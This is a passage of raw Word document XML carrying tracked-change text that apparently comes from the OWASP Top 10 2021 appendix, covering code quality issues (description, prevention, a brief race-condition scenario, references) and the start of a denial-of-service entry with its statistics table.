            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> Max Incidence Rate  | Avg Incidence Rate  | Avg Weighted Exploit  | Avg Weighted Impact  | Max Coverage  | Avg Coverage  | Total Occurrences  | Total CVEs  |</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1938ADED" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3701" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3702" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>|:-------------:|:--------------------:|:--------------------:|:--------------:|:--------------:|:----------------------:|:---------------------:|:-------------------:|:------------:|</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2E752062" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3703" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3704" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>| 38           | 49.46%              | 2.22%               | 7.1                   | 6.7                  | 60.85%        | 23.42%        | 101736             | 7564        |</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5E682DC9" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3705" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5DB15E38" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3706" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3707" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   **</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Description.*</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>* Code quality issues include known security defects</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="78788140" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3708" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3709" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    or patterns, reusing variables for multiple purposes, exposure of</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="42037E91" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3710" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3711" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    sensitive information in debugging output, off-by-one errors, time</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1B1B6682" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3712" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3713" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    of check/time of use (TOCTOU) race conditions, unsigned or signed</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="053836F0" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3714" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3715" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    conversion errors, use after free, and more. The hallmark of this</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="58A04105" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3716" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3717" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    section is that they can usually be identified with stringent</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="16EB40A0" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3718" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3719" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    compiler flags, static code analysis tools, and linter IDE plugins.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5A1AEB80" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3720" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3721" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    Modern languages by design eliminated many of these issues, such as</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="55C9823D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3722" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3723" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    Rust’s memory ownership and borrowing concept, Rust’s threading</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2E9637DA" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3724" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3725" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    design, and Go’s strict typing and bounds checking.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="53E969EE" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3726" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C91B118" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3727" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3728" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   **How to prevent**. Enable and use your editor and language’s static</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3C43B332" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3729" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3730" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    code analysis options. Consider using a static code analysis tool.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0C3E57F7" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3731" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3732" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    Consider if it might be possible to use or migrate to a language or</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4EC14731" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3733" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3734" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    framework that eliminates bug classes, such as Rust or Go.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="67D4FFEF" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3735" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="716B6B8F" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3736" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3737" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   **Example attack scenarios**. An attacker might obtain or update</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="410A30D4" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3738" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3739" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    sensitive information by exploiting a race condition using a</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3F0013CD" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3740" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3741" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    statically shared variable across multiple threads.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="010470B3" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3742" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2264329C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3743" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3744" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   **References**</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="78F64B42" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3745" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3746" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    - [OWASP Code Review </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Guide](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>https://owasp.org/www-pdf-archive/OWASP_Code_Review_Guide_v2.pdf) -</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1BB21E59" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3747" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3748" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    - [Google Code Review </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Guide](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>https://google.github.io/eng-practices/review/) -</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1B4305D7" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3749" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7543C3D9" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3750" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="43BD4542" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3751" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3752" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Denial of Service</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4F16BE55" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3753" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3690960D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3754" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3755" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">| CWEs </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Mapped  |</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> Max Incidence Rate  | Avg Incidence Rate  | Avg Weighted Exploit  | Avg Weighted Impact  | Max Coverage  | Avg Coverage  | Total Occurrences  | Total CVEs  |</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="63D93C06" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3756" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3757" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>|:-------------:|:--------------------:|:--------------------:|:--------------:|:--------------:|:----------------------:|:---------------------:|:-------------------:|:------------:|</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1FE0A113" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3758" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3759" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>| 8            | 17.54%              | 4.89%               | 8.3                   | 5.9                  | 79.58%        | 33.26%        | 66985              | 973         |</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="07902927" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
